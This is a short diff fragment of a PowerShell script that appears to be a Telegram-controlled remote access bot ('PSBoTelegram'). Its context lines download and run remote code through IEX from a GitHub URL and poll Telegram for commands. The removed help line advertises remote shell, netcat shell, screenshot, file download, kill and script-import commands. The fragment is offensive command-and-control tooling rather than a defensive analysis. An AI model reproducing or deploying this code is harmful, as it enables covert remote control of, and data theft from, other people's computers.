@@ -41,7 +41,6 @@ param (
 IEX (Invoke-WebRequest "https://raw.githubusercontent.com/cybervaca/psbotelegram/master/Functions.ps1").content
 $chat_id = $bot_Master_ID ; $getMeLink = "https://api.telegram.org/bot$botkey/getMe" ; $bot = $getMeLink -split "/" ; $bot = [string]$bot[3] ; $getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates" 
 [int]$first_connect = "1"
-$help = "PSBoTelegram V0.2`n`nComandos disponibles :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot"
 while($true) { $json = Invoke-WebRequest -Uri $getUpdatesLink -Body @{offset=$offset} | ConvertFrom-Json
     $l = $json.result.length
 	$i = 0
